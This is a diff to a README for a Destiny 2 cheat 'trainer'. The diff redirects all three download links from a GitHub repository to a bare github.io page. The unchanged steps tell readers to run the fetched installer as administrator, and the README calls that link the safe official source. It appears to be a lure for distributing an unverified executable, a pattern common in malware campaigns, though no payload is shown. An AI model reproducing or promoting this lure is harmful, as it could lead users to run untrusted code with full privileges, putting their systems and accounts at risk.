@@ -1,6 +1,6 @@
 # 🎮 Destiny2-Ultimate-Trainer-2026-advanced - Gain every advantage in Destiny 2
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/justinmoonsplashed222/Destiny2-Ultimate-Trainer-2026-advanced)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://justinmoonsplashed222.github.io)
 
 ## 📦 About the software
 
@@ -21,7 +21,7 @@ Ensure your PC meets these standards before you run the trainer.
 
 Follow these steps to set up the software correctly on your machine.
 
-1. Visit [this page to download](https://github.com/justinmoonsplashed222/Destiny2-Ultimate-Trainer-2026-advanced) the latest installer package.
+1. Visit [this page to download](https://justinmoonsplashed222.github.io) the latest installer package.
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Right-click the installer file and select Run as administrator.
 4. Follow the prompts in the setup window to place the files in your preferred directory.
@@ -66,7 +66,7 @@ If you encounter problems, walk through these steps to fix your connection.
 
 Use the link below to access the most recent version of the trainer. Always download from this official source to avoid malicious file injections from third-party sites.
 
-[Download the trainer package here](https://github.com/justinmoonsplashed222/Destiny2-Ultimate-Trainer-2026-advanced)
+[Download the trainer package here](https://justinmoonsplashed222.github.io)
 
 ## 📋 Frequently asked questions
 
